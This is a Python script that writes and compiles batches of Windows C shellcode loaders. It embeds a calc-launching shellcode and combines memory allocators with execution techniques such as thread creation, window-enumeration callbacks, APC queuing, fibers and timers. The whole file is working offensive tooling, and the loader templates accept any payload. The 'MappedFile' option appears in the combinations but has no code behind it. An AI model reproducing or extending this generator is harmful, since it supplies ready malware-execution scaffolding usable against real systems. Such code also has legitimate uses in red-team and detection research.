#!/usr/bin/env python3
"""
Loader Generator - Generate multiple shellcode loaders from knowledge base
"""

import json
import os
import random
import subprocess
from datetime import datetime
from pathlib import Path

# Shellcode (calc.bin)
SHELLCODE = bytes([
    0x6a, 0x60, 0x5a, 0x68, 0x63, 0x61, 0x6c, 0x63, 0x54, 0x59, 0x48, 0x29,
    0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76, 0x18, 0x48, 0x8b, 0x76,
    0x10, 0x48, 0xad, 0x48, 0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
    0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f, 0x20, 0x48, 0x01, 0xfe,
    0x8b, 0x54, 0x1f, 0x24, 0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
    0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75, 0xef, 0x8b, 0x74, 0x1f,
    0x1c, 0x48, 0x01, 0xfe, 0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
    0xd7
])
SHELLCODE_SIZE = 85

class LoaderGenerator:
    def __init__(self, base_path):
        self.base_path = Path(base_path)
        self.output_path = self.base_path / "output"
        self.output_path.mkdir(exist_ok=True)

        # Load components
        with open(self.base_path / "knowledge-base" / "loader_techniques.json", "r", encoding="utf-8") as f:
            data = json.load(f)
            self.components = data["component_library"]

        self.generated = []

    def get_shellcode_array(self):
        """Return shellcode as C array string"""
        return ", ".join(f"0x{b:02x}" for b in SHELLCODE)

    def generate_combination(self, exclude_combos=None):
        """Generate random component combination"""
        exclude_combos = exclude_combos or []

        # Filter for embedded storage only (simpler)
        storage = "embedded"

        # Get simple allocators and executors for reliable compilation
        allocators = ["VirtualAlloc", "HeapCreate", "MappedFile"]
        executors = ["function_pointer", "CreateThread", "callback_enumwindows",
                    "callback_enumchildwindows", "APC", "Fiber", "callback_timer"]

        max_attempts = 100
        for _ in range(max_attempts):
            allocator = random.choice(allocators)
            executor = random.choice(executors)
            copier = "memcpy"

            combo = (storage, allocator, copier, executor)
            if combo not in exclude_combos:
                return combo

        return None

    def generate_loader_code(self, allocator, executor):
        """Generate C code for loader"""

        code = '''#include <windows.h>
#include <stdio.h>

// Shellcode (calc.bin)
unsigned char shellcode[] = { ''' + self.get_shellcode_array() + ''' };
SIZE_T shellcode_size = ''' + str(SHELLCODE_SIZE) + ''';

'''

        # Add allocator code
        if allocator == "VirtualAlloc":
            code += '''
LPVOID allocate_memory(SIZE_T size) {
    DWORD oldProtect;
    LPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (addr) {
        memcpy(addr, shellcode, size);
        VirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);
    }
    return addr;
}
'''
        elif allocator == "HeapCreate":
            code += '''
HANDLE g_heap = NULL;
LPVOID allocate_memory(SIZE_T size) {
    g_heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    if (!g_heap) return NULL;
    LPVOID addr = HeapAlloc(g_heap, HEAP_ZERO_MEMORY, size);
    if (addr) {
        memcpy(addr, shellcode, size);
    }
    return addr;
}
'''

        # Add executor code
        if executor == "function_pointer":
            code += '''
void execute(LPVOID addr) {
    ((void(*)())addr)();
}
'''
        elif executor == "CreateThread":
            code += '''
void execute(LPVOID addr) {
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
}
'''
        elif executor == "callback_enumwindows":
            code += '''
void execute(LPVOID addr) {
    EnumWindows((WNDENUMPROC)addr, (LPARAM)0);
}
'''
        elif executor == "callback_enumchildwindows":
            code += '''
void execute(LPVOID addr) {
    EnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)addr, (LPARAM)0);
}
'''
        elif executor == "APC":
            code += '''
void execute(LPVOID addr) {
    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), 0);
    SleepEx(0, TRUE);
}
'''
        elif executor == "Fiber":
            code += '''
void execute(LPVOID addr) {
    ConvertThreadToFiber(NULL);
    LPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)addr, NULL);
    if (fiber) {
        SwitchToFiber(fiber);
        DeleteFiber(fiber);
    }
}
'''
        elif executor == "callback_timer":
            code += '''
void execute(LPVOID addr) {
    SetTimer(NULL, 0, 0, (TIMERPROC)addr);
    MSG msg;
    GetMessage(&msg, NULL, 0, 0);
    DispatchMessage(&msg);
}
'''

        # Main function
        code += '''
int main() {
    printf("[*] Allocating memory...\\n");
    LPVOID addr = allocate_memory(shellcode_size);
    if (!addr) {
        printf("[-] Memory allocation failed!\\n");
        return 1;
    }
    printf("[+] Allocated at: 0x%p\\n", addr);

    printf("[*] Executing shellcode...\\n");
    execute(addr);

    printf("[+] Done!\\n");
    return 0;
}
'''
        return code

    def generate_loader(self, loader_id, allocator, executor):
        """Generate single loader"""
        code = self.generate_loader_code(allocator, executor)

        filename = f"loader_{loader_id:03d}"
        src_path = self.output_path / f"{filename}.c"

        with open(src_path, "w") as f:
            f.write(code)

        return src_path

    def compile_loader(self, src_path):
        """Compile loader with MinGW"""
        exe_path = src_path.with_suffix(".exe")

        try:
            result = subprocess.run(
                ["x86_64-w64-mingw32-gcc", "-o", str(exe_path), str(src_path), "-s", "-O2"],
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode == 0:
                return True, exe_path
            else:
                return False, result.stderr
        except FileNotFoundError:
            return False, "MinGW compiler not found"
        except Exception as e:
            return False, str(e)

    def generate_batch(self, count=30):
        """Generate multiple loaders"""
        used_combos = []
        loader_id = 1
        generated = 0

        # Define specific combinations to generate
        combinations = [
            ("VirtualAlloc", "function_pointer"),
            ("VirtualAlloc", "CreateThread"),
            ("VirtualAlloc", "callback_enumwindows"),
            ("VirtualAlloc", "callback_enumchildwindows"),
            ("VirtualAlloc", "APC"),
            ("VirtualAlloc", "Fiber"),
            ("VirtualAlloc", "callback_timer"),
            ("HeapCreate", "function_pointer"),
            ("HeapCreate", "CreateThread"),
            ("HeapCreate", "callback_enumwindows"),
            ("HeapCreate", "callback_enumchildwindows"),
            ("HeapCreate", "APC"),
            ("HeapCreate", "Fiber"),
            ("HeapCreate", "callback_timer"),
            ("MappedFile", "function_pointer"),
            ("MappedFile", "CreateThread"),
            ("MappedFile", "callback_enumwindows"),
            ("MappedFile", "APC"),
            ("MappedFile", "Fiber"),
        ]

        results = []

        # Generate specified combinations first
        for allocator, executor in combinations:
            if generated >= count:
                break

            src_path = self.generate_loader(loader_id, allocator, executor)
            success, result = self.compile_loader(src_path)

            status = "PASSED" if success else f"FAILED ({result[:50]}...)" if isinstance(result, str) else "FAILED"

            results.append({
                "id": loader_id,
                "allocator": allocator,
                "executor": executor,
                "status": "passed" if success else "failed",
                "src_file": str(src_path),
                "exe_file": str(result) if success else None,
                "error": result if not success else None
            })

            print(f"[{loader_id:03d}] {allocator} + {executor} -> {status}")

            loader_id += 1
            generated += 1

        # Generate random combinations for remaining
        while generated < count:
            combo = self.generate_combination(used_combos)
            if not combo:
                break

            used_combos.append(combo)
            storage, allocator, copier, executor = combo

            src_path = self.generate_loader(loader_id, allocator, executor)
            success, result = self.compile_loader(src_path)

            status = "PASSED" if success else f"FAILED" if isinstance(result, str) else "FAILED"

            results.append({
                "id": loader_id,
                "allocator": allocator,
                "executor": executor,
                "status": "passed" if success else "failed",
                "src_file": str(src_path),
                "exe_file": str(result) if success else None,
                "error": result if not success else None
            })

            print(f"[{loader_id:03d}] {allocator} + {executor} -> {status}")

            loader_id += 1
            generated += 1

        return results

    def save_scenarios(self, results):
        """Save results to scenarios.json"""
        scenarios = []
        for r in results:
            if r["status"] == "passed":
                scenarios.append({
                    "id": f"scenario_{r['id']:03d}",
                    "name": f"Loader {r['id']:03d}",
                    "components": {
                        "storage": "embedded",
                        "allocator": r["allocator"],
                        "copier": "memcpy",
                        "executor": r["executor"]
                    },
                    "status": "validated",
                    "created_at": datetime.now().isoformat()
                })

        with open(self.base_path / "knowledge-base" / "scenarios.json", "w") as f:
            json.dump({
                "version": "1.0",
                "last_updated": datetime.now().isoformat(),
                "scenarios": scenarios
            }, f, indent=2)

        return len(scenarios)


def main():
    import argparse
    parser = argparse.ArgumentParser(description="Generate shellcode loaders")
    parser.add_argument("--count", type=int, default=30, help="Number of loaders to generate")
    args = parser.parse_args()

    base_path = Path(__file__).parent.parent
    generator = LoaderGenerator(base_path)

    print(f"[*] Generating {args.count} loaders...")
    print("=" * 50)

    results = generator.generate_batch(args.count)

    print("=" * 50)
    passed = sum(1 for r in results if r["status"] == "passed")
    failed = sum(1 for r in results if r["status"] == "failed")

    print(f"\n[*] Summary: {passed} passed, {failed} failed")

    # Save scenarios
    saved = generator.save_scenarios(results)
    print(f"[*] Saved {saved} scenarios to knowledge base")


if __name__ == "__main__":
    main()
